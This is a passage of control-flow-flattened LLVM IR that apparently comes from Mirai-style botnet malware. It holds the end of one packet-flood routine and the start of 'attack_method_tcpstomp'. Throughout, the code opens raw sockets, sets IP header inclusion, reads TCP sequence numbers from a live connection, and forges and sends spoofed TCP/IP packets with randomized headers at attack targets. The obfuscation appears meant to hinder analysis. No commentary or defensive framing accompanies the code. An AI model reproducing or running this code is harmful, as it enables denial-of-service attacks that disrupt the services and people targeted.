  %371 = select i1 %370, i32 1231502745, i32 636244020
  store i32 %371, i32* %switchVar
  br label %loopEnd

; <label>:372:                                    ; preds = %loopEntry
  %373 = call i32 @rand_next()
  %374 = and i32 %373, 65535
  %375 = trunc i32 %374 to i16
  %376 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %377 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %376, i32 0, i32 1
  store i16 %375, i16* %377, align 2
  store i32 636244020, i32* %switchVar
  br label %loopEnd

; <label>:378:                                    ; preds = %loopEntry
  %379 = load i32, i32* %18, align 4
  %380 = icmp eq i32 %379, 65535
  %381 = select i1 %380, i32 -1313590247, i32 -51604194
  store i32 %381, i32* %switchVar
  br label %loopEnd

; <label>:382:                                    ; preds = %loopEntry
  %383 = call i32 @rand_next()
  %384 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %385 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %384, i32 0, i32 2
  store i32 %383, i32* %385, align 4
  store i32 -51604194, i32* %switchVar
  br label %loopEnd

; <label>:386:                                    ; preds = %loopEntry
  %387 = load i32, i32* %19, align 4
  %388 = icmp eq i32 %387, 65535
  %389 = select i1 %388, i32 -403050682, i32 20353661
  store i32 %389, i32* %switchVar
  br label %loopEnd

; <label>:390:                                    ; preds = %loopEntry
  %391 = call i32 @rand_next()
  %392 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %393 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %392, i32 0, i32 3
  store i32 %391, i32* %393, align 4
  store i32 20353661, i32* %switchVar
  br label %loopEnd

; <label>:394:                                    ; preds = %loopEntry
  %395 = load i8, i8* %27, align 1
  %396 = icmp ne i8 %395, 0
  %397 = select i1 %396, i32 1356301291, i32 -38703794
  store i32 %397, i32* %switchVar
  br label %loopEnd

; <label>:398:                                    ; preds = %loopEntry
  %399 = load i8*, i8** %35, align 8
  %400 = load i32, i32* %26, align 4
  call void @rand_str(i8* %399, i32 %400)
  store i32 -38703794, i32* %switchVar
  br label %loopEnd

; <label>:401:                                    ; preds = %loopEntry
  %402 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %403 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %402, i32 0, i32 7
  store i16 0, i16* %403, align 2
  %404 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %405 = bitcast %struct.iphdr* %404 to i16*
  %406 = call zeroext i16 @checksum_generic(i16* %405, i32 20)
  %407 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %408 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %407, i32 0, i32 7
  store i16 %406, i16* %408, align 2
  %409 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %410 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %409, i32 0, i32 6
  store i16 0, i16* %410, align 4
  %411 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %412 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %413 = bitcast %struct.tcphdr* %412 to i8*
  %414 = load i32, i32* %26, align 4
  %415 = sext i32 %414 to i64
  %416 = add i64 20, %415
  %417 = trunc i64 %416 to i16
  %418 = call zeroext i16 @htons(i16 zeroext %417) #7
  %419 = load i32, i32* %26, align 4
  %420 = sext i32 %419 to i64
  %421 = add i64 20, %420
  %422 = trunc i64 %421 to i32
  %423 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %411, i8* %413, i16 zeroext %418, i32 %422)
  %424 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %425 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %424, i32 0, i32 6
  store i16 %423, i16* %425, align 4
  %426 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %427 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %426, i32 0, i32 1
  %428 = load i16, i16* %427, align 2
  %429 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %430 = load i32, i32* %9, align 4
  %431 = sext i32 %430 to i64
  %432 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %429, i64 %431
  %433 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %432, i32 0, i32 0
  %434 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %433, i32 0, i32 1
  store i16 %428, i16* %434, align 2
  %435 = load i32, i32* %10, align 4
  %436 = load i8*, i8** %32, align 8
  %437 = load i32, i32* %26, align 4
  %438 = sext i32 %437 to i64
  %439 = add i64 40, %438
  %440 = bitcast %union.__CONST_SOCKADDR_ARG* %36 to %struct.sockaddr**
  %441 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %442 = load i32, i32* %9, align 4
  %443 = sext i32 %442 to i64
  %444 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %441, i64 %443
  %445 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %444, i32 0, i32 0
  %446 = bitcast %struct.sockaddr_in* %445 to %struct.sockaddr*
  store %struct.sockaddr* %446, %struct.sockaddr** %440, align 8
  %447 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %36, i32 0, i32 0
  %448 = load %struct.sockaddr*, %struct.sockaddr** %447, align 8
  %449 = call i64 @sendto(i32 %435, i8* %436, i64 %439, i32 16384, %struct.sockaddr* %448, i32 16)
  store i32 -91142824, i32* %switchVar
  br label %loopEnd

; <label>:450:                                    ; preds = %loopEntry
  %451 = load i32, i32* %9, align 4
  %452 = add nsw i32 %451, 1
  store i32 %452, i32* %9, align 4
  store i32 292055867, i32* %switchVar
  br label %loopEnd

; <label>:453:                                    ; preds = %loopEntry
  store i32 424732474, i32* %switchVar
  br label %loopEnd

; <label>:454:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %453, %450, %401, %398, %394, %390, %386, %382, %378, %372, %367, %361, %356, %350, %345, %341, %337, %316, %293, %287, %286, %285, %282, %279, %273, %178, %174, %126, %120, %119, %116, %110, %109, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpstomp(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.attack_stomp_data*, align 8
  %12 = alloca i8**, align 8
  %13 = alloca i8, align 1
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i16, align 2
  %18 = alloca i8, align 1
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i32, align 4
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.sockaddr_in, align 4
  %28 = alloca %struct.sockaddr_in, align 4
  %29 = alloca i32, align 4
  %30 = alloca [256 x i8], align 16
  %31 = alloca i64, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %33 = alloca i32, align 4
  %34 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.tcphdr*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %struct.iphdr*, align 8
  %41 = alloca %struct.tcphdr*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %44 = load i8, i8* %5, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 %45, i64 16) #6
  %47 = bitcast i8* %46 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %47, %struct.attack_stomp_data** %11, align 8
  %48 = load i8, i8* %5, align 1
  %49 = zext i8 %48 to i64
  %50 = call noalias i8* @calloc(i64 %49, i64 8) #6
  %51 = bitcast i8* %50 to i8**
  store i8** %51, i8*** %12, align 8
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 2, i32 0)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %13, align 1
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 3, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %14, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 4, i32 64)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %15, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 5, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %16, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 7, i32 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %17, align 2
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 11, i32 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %18, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 12, i32 1)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %19, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 13, i32 1)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %20, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 14, i32 0)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %21, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 15, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %22, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = call i32 @attack_get_opt_int(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 16, i32 0)
  %95 = trunc i32 %94 to i8
  store i8 %95, i8* %23, align 1
  %96 = load i8, i8* %7, align 1
  %97 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %98 = call i32 @attack_get_opt_int(i8 zeroext %96, %struct.attack_option* %97, i8 zeroext 0, i32 768)
  store i32 %98, i32* %24, align 4
  %99 = load i8, i8* %7, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %101 = call i32 @attack_get_opt_int(i8 zeroext %99, %struct.attack_option* %100, i8 zeroext 1, i32 1)
  %102 = trunc i32 %101 to i8
  store i8 %102, i8* %25, align 1
  %103 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %103, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 2125685658, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 2125685658, label %first
    i32 -1805510890, label %106
    i32 -414556231, label %107
    i32 -1901273540, label %113
    i32 -1642515913, label %116
    i32 -1246967717, label %117
    i32 1248997353, label %123
    i32 2137523763, label %124
    i32 1737925641, label %128
    i32 1816704974, label %129
    i32 1003669248, label %145
    i32 -495355406, label %166
    i32 947459059, label %175
    i32 -1898037847, label %180
    i32 350995967, label %185
    i32 1693596626, label %189
    i32 1155307588, label %197
    i32 -1387047317, label %209
    i32 -720949428, label %210
    i32 -1882787547, label %219
    i32 -477756553, label %224
    i32 -1560830850, label %237
    i32 -1600246064, label %246
    i32 -2016388085, label %255
    i32 -972472228, label %347
    i32 -261601980, label %351
    i32 -1107915248, label %473
    i32 -948060510, label %482
    i32 -1309983456, label %491
    i32 -1256840644, label %494
    i32 -564985080, label %495
    i32 -1604423163, label %496
    i32 -1710798392, label %497
    i32 -1300222963, label %503
    i32 -72949968, label %506
    i32 -431011026, label %507
    i32 712238639, label %508
    i32 1487939958, label %511
    i32 -1195686463, label %512
    i32 562727587, label %513
    i32 -1756905999, label %519
    i32 1229991099, label %537
    i32 -1854089570, label %543
    i32 -434764079, label %547
    i32 1732950702, label %550
    i32 -380119843, label %622
    i32 1738933828, label %625
    i32 -1395225135, label %626
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %104 = icmp eq i32 %.reload, -1
  %105 = select i1 %104, i32 -1805510890, i32 -414556231
  store i32 %105, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  store i32 -1395225135, i32* %switchVar
  br label %loopEnd

; <label>:107:                                    ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %108 = load i32, i32* %10, align 4
  %109 = bitcast i32* %9 to i8*
  %110 = call i32 @setsockopt(i32 %108, i32 0, i32 3, i8* %109, i32 4) #6
  %111 = icmp eq i32 %110, -1
  %112 = select i1 %111, i32 -1901273540, i32 -1642515913
  store i32 %112, i32* %switchVar
  br label %loopEnd

; <label>:113:                                    ; preds = %loopEntry
  %114 = load i32, i32* %10, align 4
  %115 = call i32 @close(i32 %114)
  store i32 -1395225135, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -1246967717, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  %118 = load i32, i32* %9, align 4
  %119 = load i8, i8* %5, align 1
  %120 = zext i8 %119 to i32
  %121 = icmp slt i32 %118, %120
  %122 = select i1 %121, i32 1248997353, i32 1487939958
  store i32 %122, i32* %switchVar
  br label %loopEnd

; <label>:123:                                    ; preds = %loopEntry
  store i32 2137523763, i32* %switchVar
  br label %loopEnd

; <label>:124:                                    ; preds = %loopEntry
  %125 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %125, i32* %26, align 4
  %126 = icmp eq i32 %125, -1
  %127 = select i1 %126, i32 1737925641, i32 1816704974
  store i32 %127, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  store i32 712238639, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  %130 = load i32, i32* %26, align 4
  %131 = load i32, i32* %26, align 4
  %132 = call i32 (i32, i32, ...) @fcntl(i32 %131, i32 3, i32 0)
  %133 = or i32 %132, 2048
  %134 = call i32 (i32, i32, ...) @fcntl(i32 %130, i32 4, i32 %133)
  %135 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 0
  store i16 2, i16* %135, align 4
  %136 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %137 = load i32, i32* %9, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %136, i64 %138
  %140 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %139, i32 0, i32 2
  %141 = load i8, i8* %140, align 4
  %142 = zext i8 %141 to i32
  %143 = icmp slt i32 %142, 32
  %144 = select i1 %143, i32 1003669248, i32 -495355406
  store i32 %144, i32* %switchVar
  br label %loopEnd

; <label>:145:                                    ; preds = %loopEntry
  %146 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %147 = load i32, i32* %9, align 4
  %148 = sext i32 %147 to i64
  %149 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %146, i64 %148
  %150 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %149, i32 0, i32 1
  %151 = load i32, i32* %150, align 4
  %152 = call i32 @ntohl(i32 %151) #7
  %153 = call i32 @rand_next()
  %154 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %155 = load i32, i32* %9, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %154, i64 %156
  %158 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %157, i32 0, i32 2
  %159 = load i8, i8* %158, align 4
  %160 = zext i8 %159 to i32
  %161 = lshr i32 %153, %160
  %162 = add i32 %152, %161
  %163 = call i32 @htonl(i32 %162) #7
  %164 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %165 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %164, i32 0, i32 0
  store i32 %163, i32* %165, align 4
  store i32 947459059, i32* %switchVar
  br label %loopEnd

; <label>:166:                                    ; preds = %loopEntry
  %167 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %168 = load i32, i32* %9, align 4
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %167, i64 %169
  %171 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %170, i32 0, i32 1
  %172 = load i32, i32* %171, align 4
  %173 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %174 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %173, i32 0, i32 0
  store i32 %172, i32* %174, align 4
  store i32 947459059, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  %176 = load i16, i16* %17, align 2
  %177 = zext i16 %176 to i32
  %178 = icmp eq i32 %177, 65535
  %179 = select i1 %178, i32 -1898037847, i32 350995967
  store i32 %179, i32* %switchVar
  br label %loopEnd

; <label>:180:                                    ; preds = %loopEntry
  %181 = call i32 @rand_next()
  %182 = and i32 %181, 65535
  %183 = trunc i32 %182 to i16
  %184 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %183, i16* %184, align 2
  store i32 1693596626, i32* %switchVar
  br label %loopEnd

; <label>:185:                                    ; preds = %loopEntry
  %186 = load i16, i16* %17, align 2
  %187 = call zeroext i16 @htons(i16 zeroext %186) #7
  %188 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %187, i16* %188, align 2
  store i32 1693596626, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  %190 = load i32, i32* %26, align 4
  %191 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %192 = bitcast %struct.sockaddr_in* %27 to %struct.sockaddr*
  store %struct.sockaddr* %192, %struct.sockaddr** %191, align 8
  %193 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %194 = load %struct.sockaddr*, %struct.sockaddr** %193, align 8
  %195 = call i32 @connect(i32 %190, %struct.sockaddr* %194, i32 16)
  %196 = call i64 @time(i64* null) #6
  store i64 %196, i64* %31, align 8
  store i32 1155307588, i32* %switchVar
  br label %loopEnd

; <label>:197:                                    ; preds = %loopEntry
  store i32 16, i32* %29, align 4
  %198 = load i32, i32* %10, align 4
  %199 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %200 = bitcast %union.__CONST_SOCKADDR_ARG* %34 to %struct.sockaddr**
  %201 = bitcast %struct.sockaddr_in* %28 to %struct.sockaddr*
  store %struct.sockaddr* %201, %struct.sockaddr** %200, align 8
  %202 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %34, i32 0, i32 0
  %203 = load %struct.sockaddr*, %struct.sockaddr** %202, align 8
  %204 = call i64 @recvfrom(i32 %198, i8* %199, i64 256, i32 16384, %struct.sockaddr* %203, i32* %29)
  %205 = trunc i64 %204 to i32
  store i32 %205, i32* %33, align 4
  %206 = load i32, i32* %33, align 4
  %207 = icmp eq i32 %206, -1
  %208 = select i1 %207, i32 -1387047317, i32 -720949428
  store i32 %208, i32* %switchVar
  br label %loopEnd

; <label>:209:                                    ; preds = %loopEntry
  store i32 -1395225135, i32* %switchVar
  br label %loopEnd

; <label>:210:                                    ; preds = %loopEntry
  %211 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %28, i32 0, i32 2
  %212 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %211, i32 0, i32 0
  %213 = load i32, i32* %212, align 4
  %214 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %215 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %214, i32 0, i32 0
  %216 = load i32, i32* %215, align 4
  %217 = icmp eq i32 %213, %216
  %218 = select i1 %217, i32 -1882787547, i32 -1710798392
  store i32 %218, i32* %switchVar
  br label %loopEnd

; <label>:219:                                    ; preds = %loopEntry
  %220 = load i32, i32* %33, align 4
  %221 = sext i32 %220 to i64
  %222 = icmp ugt i64 %221, 40
  %223 = select i1 %222, i32 -477756553, i32 -1710798392
  store i32 %223, i32* %switchVar
  br label %loopEnd

; <label>:224:                                    ; preds = %loopEntry
  %225 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %226 = getelementptr inbounds i8, i8* %225, i64 20
  %227 = bitcast i8* %226 to %struct.tcphdr*
  store %struct.tcphdr* %227, %struct.tcphdr** %35, align 8
  %228 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %229 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %228, i32 0, i32 0
  %230 = load i16, i16* %229, align 4
  %231 = zext i16 %230 to i32
  %232 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %233 = load i16, i16* %232, align 2
  %234 = zext i16 %233 to i32
  %235 = icmp eq i32 %231, %234
  %236 = select i1 %235, i32 -1560830850, i32 -1604423163
  store i32 %236, i32* %switchVar
  br label %loopEnd

; <label>:237:                                    ; preds = %loopEntry
  %238 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %239 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %238, i32 0, i32 4
  %240 = load i16, i16* %239, align 4
  %241 = lshr i16 %240, 9
  %242 = and i16 %241, 1
  %243 = zext i16 %242 to i32
  %244 = icmp ne i32 %243, 0
  %245 = select i1 %244, i32 -1600246064, i32 -1107915248
  store i32 %245, i32* %switchVar
  br label %loopEnd

; <label>:246:                                    ; preds = %loopEntry
  %247 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %248 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %247, i32 0, i32 4
  %249 = load i16, i16* %248, align 4
  %250 = lshr i16 %249, 12
  %251 = and i16 %250, 1
  %252 = zext i16 %251 to i32
  %253 = icmp ne i32 %252, 0
  %254 = select i1 %253, i32 -2016388085, i32 -1107915248
  store i32 %254, i32* %switchVar
  br label %loopEnd

; <label>:255:                                    ; preds = %loopEntry
  %256 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %257 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %256, i32 0, i32 0
  %258 = load i32, i32* %257, align 4
  %259 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %260 = load i32, i32* %9, align 4
  %261 = sext i32 %260 to i64
  %262 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %259, i64 %261
  %263 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %262, i32 0, i32 0
  store i32 %258, i32* %263, align 4
  %264 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %265 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %264, i32 0, i32 2
  %266 = load i32, i32* %265, align 4
  %267 = call i32 @ntohl(i32 %266) #7
  %268 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %269 = load i32, i32* %9, align 4
  %270 = sext i32 %269 to i64
  %271 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %268, i64 %270
  %272 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %271, i32 0, i32 1
  store i32 %267, i32* %272, align 4
  %273 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %274 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %273, i32 0, i32 3
  %275 = load i32, i32* %274, align 4
  %276 = call i32 @ntohl(i32 %275) #7
  %277 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %278 = load i32, i32* %9, align 4
  %279 = sext i32 %278 to i64
  %280 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %277, i64 %279
  %281 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %280, i32 0, i32 2
  store i32 %276, i32* %281, align 4
  %282 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %283 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %282, i32 0, i32 1
  %284 = load i16, i16* %283, align 2
  %285 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %286 = load i32, i32* %9, align 4
  %287 = sext i32 %286 to i64
  %288 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %285, i64 %287
  %289 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %288, i32 0, i32 3
  store i16 %284, i16* %289, align 4
  %290 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %291 = load i16, i16* %290, align 2
  %292 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %293 = load i32, i32* %9, align 4
  %294 = sext i32 %293 to i64
  %295 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %292, i64 %294
  %296 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %295, i32 0, i32 4
  store i16 %291, i16* %296, align 2
  %297 = load i32, i32* %24, align 4
  %298 = sext i32 %297 to i64
  %299 = add i64 40, %298
  %300 = call noalias i8* @malloc(i64 %299) #6
  %301 = load i8**, i8*** %12, align 8
  %302 = load i32, i32* %9, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds i8*, i8** %301, i64 %303
  store i8* %300, i8** %304, align 8
  %305 = load i8**, i8*** %12, align 8
  %306 = load i32, i32* %9, align 4
  %307 = sext i32 %306 to i64
  %308 = getelementptr inbounds i8*, i8** %305, i64 %307
  %309 = load i8*, i8** %308, align 8
  %310 = bitcast i8* %309 to %struct.iphdr*
  store %struct.iphdr* %310, %struct.iphdr** %36, align 8
  %311 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %312 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %311, i64 1
  %313 = bitcast %struct.iphdr* %312 to %struct.tcphdr*
  store %struct.tcphdr* %313, %struct.tcphdr** %37, align 8
  %314 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %315 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %314, i64 1
  %316 = bitcast %struct.tcphdr* %315 to i8*
  store i8* %316, i8** %38, align 8
  %317 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %318 = bitcast %struct.iphdr* %317 to i8*
  %319 = load i8, i8* %318, align 4
  %320 = and i8 %319, 15
  %321 = or i8 %320, 64
  store i8 %321, i8* %318, align 4
  %322 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %323 = bitcast %struct.iphdr* %322 to i8*
  %324 = load i8, i8* %323, align 4
  %325 = and i8 %324, -16
  %326 = or i8 %325, 5
  store i8 %326, i8* %323, align 4
  %327 = load i8, i8* %13, align 1
  %328 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %329 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %328, i32 0, i32 1
  store i8 %327, i8* %329, align 1
  %330 = load i32, i32* %24, align 4
  %331 = sext i32 %330 to i64
  %332 = add i64 40, %331
  %333 = trunc i64 %332 to i16
  %334 = call zeroext i16 @htons(i16 zeroext %333) #7
  %335 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %336 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %335, i32 0, i32 2
  store i16 %334, i16* %336, align 2
  %337 = load i16, i16* %14, align 2
  %338 = call zeroext i16 @htons(i16 zeroext %337) #7
  %339 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %340 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %339, i32 0, i32 3
  store i16 %338, i16* %340, align 4
  %341 = load i8, i8* %15, align 1
  %342 = load %struct.iphdr*, %struct.iphdr** %36, align 8
